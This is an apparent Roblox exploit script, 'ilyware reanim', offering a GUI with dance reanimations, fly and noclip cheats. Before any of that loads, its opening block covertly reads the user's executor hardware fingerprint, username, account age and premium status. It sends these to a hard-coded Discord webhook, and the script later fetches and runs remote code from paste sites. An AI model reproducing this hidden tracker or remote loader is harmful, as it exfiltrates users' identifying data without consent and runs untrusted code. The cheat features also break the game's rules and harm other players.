plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
	local HttpServ = game:GetService('HttpService')
	local url = "https://discord.com/api/webhooks/780535232608075807/FF-MQKVKKsMIuSO1Vmiq0nciKICKld_fJRCVrNzHOyu7GgUTeV2swV5Pep1JohSc8XIm"


	local data = 
		{
			["content"] = "",
			["embeds"] = {{
				["title"] = "__**HWID:**__",
				["description"] = hwid,
				["type"] = "rich",
				["color"] = tonumber(0xAB0909),
				["fields"] = {
					{
						["name"] = "Username:",
						["value"] = Game.Players.LocalPlayer.Name,
						["inline"] = true
					},
					{
						["name"] = "Game Link:",
						["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
						["inline"] = true
					},
					{
						["name"] = "Game Name:",
						["value"] = info.Name,
						["inline"] = true
					},
					{
						["name"] = "Age:",
						["value"] = plr.AccountAge,
						["inline"] = true
					},
					{
						["name"] = "Premium:",
						["value"] = premium,
						["inline"] = true
					},
					{
						["name"] = "ALT:",
						["value"] = ALT,
						["inline"] = true
					},

				},
			}}
		}
	local newdata = HttpServ:JSONEncode(data)

	local headers = {
		["content-type"] = "application/json"
	}

	local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
	http_request(request_payload)
end

------------------------------


game["Run Service"].RenderStepped:connect(function()
	settings().Physics.AllowSleep = false
	setsimulationradius(math.huge*math.huge,math.huge*math.huge)
end)

local library = loadstring(game:HttpGet("https://pastebin.com/raw/BjD084ND"))()
local venyx = library.new("ilyware reanim", 5013109572)
print("GUI Loaded")
wait(1)

--Animation Page
local anims = venyx:addPage("Animations", 5012544693)
local animss = anims:addSection("Animations")
animss:addButton("Reanimate (Click First)", function()
	local Frame = (60)

	Service = setmetatable(
		{
			Get = function(Self, Serv)
				if Service[Serv] then return Service[Serv] end
				local S = game:GetService(Serv)
				if S then Service[Serv] = S end
				return S
			end;
		}, {
			__index = function(Self, Index)
				local S = game:GetService(Index)
				if S then Service[Index] = S end
				return S
			end;
		})

	local LP = Service['Players'].LocalPlayer; local Char = LP['Character']
	local Torso, Root, Humanoid = Char['Torso'], Char['HumanoidRootPart'], Char['Humanoid']
	local TService, UIS = Service['TweenService'], Service['UserInputService']

	coroutine.wrap(function()
		Root['Anchored'] = true;
		wait(.8)
		Root['Anchored'] = false;
	end)()


	local SetSimulationRadius = setsimulationradius



	game.RunService.Stepped:Connect(function()

		SetSimulationRadius(math.huge, math.huge)

	end)



	local Create = function(Obj,Parent)
		local I = Instance.new(Obj); I['Parent'] = Parent; return I
	end

	local Contains = function(Table,KV)
		for K,V in next, Table do 
			if rawequal(KV,K) or rawequal(KV,V) then 
				return true;
			end
		end
		return false
	end

	local PoseToCF = function(Pose,Motor)
		return (Motor['Part0'].CFrame * Motor['C0'] * Pose['CFrame'] * Motor['C1']:Inverse()):ToObjectSpace(Motor['Part0'].CFrame)
	end

	local Joints = {
		['Torso'] = Root['RootJoint'];
		['Left Arm'] = Torso['Left Shoulder'];
		['Right Arm'] = Torso['Right Shoulder'];
		['Left Leg'] = Torso['Left Hip'];
		['Right Leg'] = Torso['Right Hip'];
	}

	for K,V in next, Char:GetChildren() do 
		if V:IsA('BasePart') then 
			coroutine.wrap(function()
				repeat V['CanCollide'] = false
					Service['RunService'].Stepped:Wait() until Humanoid['Health'] < 1
			end)()
		end
	end

	for K,V in next, Joints do 
		local AP, AO, A0, A1 = Create('AlignPosition',V['Part1']), Create('AlignOrientation',V['Part1']), Create('Attachment',V['Part1']), Create('Attachment',V['Part0'])
		AP['RigidityEnabled'] = true; AO['RigidityEnabled'] = true; AP['Attachment0'] = A0; AP['Attachment1'] = A1; AO['Attachment0'] = A0; AO['Attachment1'] = A1;
		A0['Name'] = 'CFAttachment0'; A1['Name'] = 'CFAttachment1'; A0['CFrame'] = V['C1'] * V['C0']:Inverse(); V:Remove()
	end

	local Edit = function(Part,Value,Duration,Style,Direction)
		Style = Style or 'Enum.EasingStyle.Linear'; Direction = Direction or 'Enum.EasingDirection.In'
		local Attachment = Part:FindFirstChild('CFAttachment0')
		if Attachment ~= nil then
			TService:Create(Attachment,TweenInfo.new(Duration,Enum['EasingStyle'][tostring(Style):split('.')[3]],Enum['EasingDirection'][tostring(Direction):split('.')[3]],0,false,0),{CFrame = Value}):Play()
		end
	end

	if not Service['RunService']:FindFirstChild('Delta') then
		local Delta = Create('BindableEvent',Service['RunService']); Delta['Name'] = 'Delta'
		local A, B = 0, tick()
		Service['RunService'].Delta:Fire(); Service['RunService'].Heartbeat:Connect(function(C, D)
			A = A + C
			if A >= (1/Frame) then
				for I = 1, math.floor(A / (1/Frame)) do
					Service['RunService'].Delta:Fire()
				end
				B = tick()
				A = A - (1/Frame) * math.floor(A / (1/Frame))
			end
		end)
	end

	coroutine.wrap(function()
		Humanoid['Died']:Wait()
		for K,V in next, Char:GetDescendants() do 
			if V['Name']:match('Align') then 
				V:Destroy()
			end
		end
	end)()

	local PreloadAnimation = function(AssetId)
		local Sequence = game:GetObjects('rbxassetid://'..AssetId)[1]; assert(Sequence:IsA('KeyframeSequence'),'Instance is not a KeyframeSequence.')
		wait(.06)
		local Class = {}
		Class['Speed'] = 1
		local Yield = function(Seconds)
			local Time = Seconds * (Frame + Sequence:GetKeyframes()[#Sequence:GetKeyframes()].Time)
			for I = 1,Time,Class['Speed'] do 
				Service['RunService'].Delta['Event']:Wait()
			end
		end
		Class['Stopped'] = false;
		Class['Complete'] = Instance.new('BindableEvent')
		Class['Play'] = function()
			Class['Stopped'] = false
			coroutine.wrap(function()
				repeat
					for K = 1,#Sequence:GetKeyframes() do 
						local K0, K1, K2 = Sequence:GetKeyframes()[K-1], Sequence:GetKeyframes()[K], Sequence:GetKeyframes()[K+1]
						if Class['Stopped'] ~= true and Humanoid['Health'] > 0 then
							if K0 ~= nil then 
								Yield(K1['Time'] - K0['Time'])
							end
							coroutine.wrap(function()
								for I = 1,#K1:GetDescendants() do 
									local Pose = K1:GetDescendants()[I]
									if Contains(Joints,Pose['Name']) then 
										local Duration = K2 ~= nil and (K2['Time'] - K1['Time'])/Class['Speed'] or .5
										Edit(Char[Pose['Name']],PoseToCF(Pose,Joints[Pose['Name']]),Duration,Pose['EasingStyle'],Pose['EasingDirection'])
									end
								end
							end)()
						end
					end
					Class['Complete']:Fire()
				until Sequence['Loop'] ~= true or Class['Stopped'] ~= false or Humanoid['Health'] < 1
			end)()
		end
		Class['Stop'] = function()
			Class['Stopped'] = true;
		end
		Class['Reset'] = function()
			coroutine.wrap(function()
				wait(.02)
				assert(Class['Stopped'],'Track Must Be Stopped First!')
				for K,V in next, Joints do 
					local Part = Char[K]
					if Part ~= nil then 
						local Attachment = Part:FindFirstChild('CFAttachment0')
						if Attachment ~= nil then 
							Attachment['CFrame'] = V['C1'] * V['C0']:Inverse()
						end
					end
				end
			end)()
		end
		return Class
	end

	Humanoid.WalkSpeed = 11

	local Anims = {
		['Idle'] = PreloadAnimation(5183986020);
		['Walk'] = PreloadAnimation(5053650512);
		['Run'] = PreloadAnimation(5053715968);
		['Jump'] = PreloadAnimation(4073859368);
		['Fall'] = PreloadAnimation(3323393688);
	}

	wait(1)
	local Connections = {};

	Mouse = LP:GetMouse()
	local Dancing, Running = false, false;

	StopAll = function()
		for K,V in next, Anims do 
			if V['Stopped'] ~= true then 
				V:Stop()
			end
		end
	end

	Anims['Idle']:Play(); Dancing = false; Anims['Walk'].Stopped = true; Anims['Run'].Stopped = true

	Connections['Run'] = Humanoid['Running']:Connect(function(Speed)
		if Speed > 6 and Dancing ~= true and Anims['Walk'].Stopped ~= false and runnning ~= true then
			Anims['Idle']:Stop()
			Anims['Jump']:Stop()
			Anims['Fall']:Stop()
			Anims['Run']:Stop()
			Anims['Walk']:Play()
		elseif Speed < 5 and Dancing ~= true and Anims['Walk'].Stopped ~= true and runnning ~= true then
			Anims['Walk']:Stop()
			Anims['Jump']:Stop()
			Anims['Fall']:Stop()
			Anims['Run']:Stop()
			Anims['Idle']:Play()
		elseif Speed < 5 and Dancing ~= true and Anims['Jump'].Stopped ~= true or Anims['Fall'].Stopped ~= true then
			Anims['Walk']:Stop()
			Anims['Jump']:Stop()
			Anims['Fall']:Stop()
			Anims['Run']:Stop()
			Anims['Idle']:Play()
		end
	end)
	Connections['Jumping'] = Humanoid['Jumping']:Connect(function(active)
		if active and Dancing ~= true and Anims['Jump'].Stopped ~= false then
			Anims['Idle']:Stop()
			Anims['Walk']:Stop()
			Anims['Fall']:Stop()
			Anims['Run']:Stop()
			Anims['Jump']:Play()
		end
	end)
	Connections['FreeFalling'] = Humanoid['FreeFalling']:Connect(function(active)
		if active and Dancing ~= true and Anims['Jump'].Stopped ~= false then
			Anims['Idle']:Stop()
			Anims['Walk']:Stop()
			Anims['Jump']:Stop()
			Anims['Run']:Stop()
			Anims['Fall']:Play()
		end
	end)

	Mouse.KeyDown:connect(function(key)
		if key:lower() == string.char(48) then --string.char(48) is just shift
			if Humanoid and Anims['Walk'].Stopped ~= true then
				Anims['Walk']:Stop()
				Anims['Jump']:Stop()
				Anims['Fall']:Stop()
				Anims['Idle']:Stop()
				Anims['Run']:Play()
				runnning = true
				Humanoid.WalkSpeed = 18
			end
		end
	end)

	--When button is lifted
	Mouse.KeyUp:connect(function(key)
		if key:lower() == string.char(48) then --string.char(48) is just shift
			if Humanoid then
				runnning = false
				Humanoid.WalkSpeed = 11
			end
		end
	end)

	wait(1)
	Bind = function(Id,Speed)
		sped = Speed
		local Animation = PreloadAnimation(Id)
		table.insert(Anims,Animation)
		if Dancing ~= true then Dancing = true;
			StopAll(); wait(.1); Animation:Play() Animation['Speed'] = sped
		else Dancing = false;
			StopAll(); wait(.1); Anims['Idle']:Play()
		end
	end

	loadstring(game:HttpGet("https://ghostbin.co/paste/krmyf/raw",true))()
end)

local speeda = 1
animss:addSlider("Animation Speed", 1, 1, 10, function(value)
	speeda = value
end)
local id = 0
animss:addTextbox("ID Player", "ID", function(value, focusLost)
	id = value
end)
animss:addButton("Play ID", function()
	Bind(id,speeda)
end)
animss:addButton("Renegade", function()
	Bind(4686555525,speeda)
end)
wait(.1)
animss:addButton("Breakdown", function()
	Bind(4558409610,speeda)
end)
wait(.1)
animss:addButton("Default Dance", function()
	Bind(3259216638,speeda)
end)
wait(.1)
animss:addButton("Smug Dancing", function()
	Bind(3450125501,speeda)
end)
wait(.1)
animss:addButton("Torture", function()
	Bind(4109162757,speeda)
end)
wait(.1)
animss:addButton("Shuffle", function()
	Bind(4835795413,speeda)
end)
wait(.1)
animss:addButton("Boogie Down", function()
	Bind(3623215692,speeda)
end)
wait(.1)
animss:addButton("Electro Shuffle", function()
	Bind(3619935462,speeda)
end)
wait(.1)
animss:addButton("Crabby", function()
	Bind(3643129020,speeda)
end)
wait(.1)
animss:addButton("Goopy", function()
	Bind(5238669868,speeda)
end)
wait(.1)
animss:addButton("Orange Justice", function()
	Bind(3262592866,speeda)
end)
wait(.1)
animss:addButton("Casual Sit", function()
	Bind(5069868968,speeda)
end)
wait(.1)
animss:addButton("Carson Dance", function()
	Bind(5713461790,speeda)
end)
wait(.1)
animss:addButton("Weird Humping", function()
	Bind(5362230261,speeda)
end)
wait(.1)
animss:addButton("Whip", function()
	Bind(5713511509,speeda)
end)
wait(.1)
animss:addButton("Rewind", function()
	Bind(5011408603,speeda)
end)
wait(.1)
animss:addButton("Garry Dance", function()
	Bind(4300223810,speeda)
end)
wait(.1)
animss:addButton("Russian", function()
	Bind(4787449997,speeda)
end)

print("Animations Loaded")

--Settings
local setting = venyx:addPage("Settings", 5012544693)
local information = setting:addSection("Information")
information:addButton("Made by The Ilyware Team.", function()
end)
information:addButton("im dead", function()
end)
local sett = setting:addSection("Settings")
sett:addButton("Rejoin", function()
	local plr = game:GetService("Players").LocalPlayer
	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
end)
local on = false
local Players = game.Players
function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end


IYMouse = game.Players.LocalPlayer:GetMouse()

function sFLY(vfly)
	repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
	repeat wait() until IYMouse

	local T = getRoot(Players.LocalPlayer.Character)
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0

	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
			repeat wait()
				if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
				end
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			end
		end)
	end
	IYMouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			if vfly then
				CONTROL.F = 1
			else
				CONTROL.F = 1
			end
		elseif KEY:lower() == 's' then
			if vfly then
				CONTROL.B = - 1
			else
				CONTROL.B = - 1
			end
		elseif KEY:lower() == 'a' then
			if vfly then
				CONTROL.L = - 1
			else
				CONTROL.L = - 1
			end
		elseif KEY:lower() == 'd' then 
			if vfly then
				CONTROL.R = 1
			else
				CONTROL.R = 1
			end
		end
	end)
	IYMouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'e' then
			CONTROL.Q = 0
		elseif KEY:lower() == 'q' then
			CONTROL.E = 0
		end
	end)
	FLY()
end
sett:addButton("Fly", function()
	if on then
		sett:updateButton("Unfly", "Fly")
		on = false
		FLYING = false
		Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	else
		sett:updateButton("Fly", "Unfly")
		on = true
		sFLY()
	end
end)
local noclip = false
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local mouse = player:GetMouse()

spawn(function()
	while true do
		player = game.Players.LocalPlayer
		character = player.Character

		if noclip then
			for _, v in pairs(character:GetDescendants()) do
				pcall(function()
					if v:IsA("BasePart") then
						v.CanCollide = false
					end
				end)
			end
		end

		game:GetService("RunService").Stepped:wait()
	end
end)
local on1 = false
sett:addButton("Noclip", function()
	if on1 then
		sett:updateButton("Unnoclip", "Noclip")
		on1 = false
		noclip = false
	else
		sett:updateButton("Noclip", "Unnoclip")
		on1 = true
		noclip = true
	end
end)
sett:addButton("Destroy UI", function()
	game.CoreGui.xxHub:Destroy()
end)
sett:addKeybind("Toggle Keybind", Enum.KeyCode.Equals, function()
	venyx:toggle()
end, function()
end)

print("Settings Loaded")


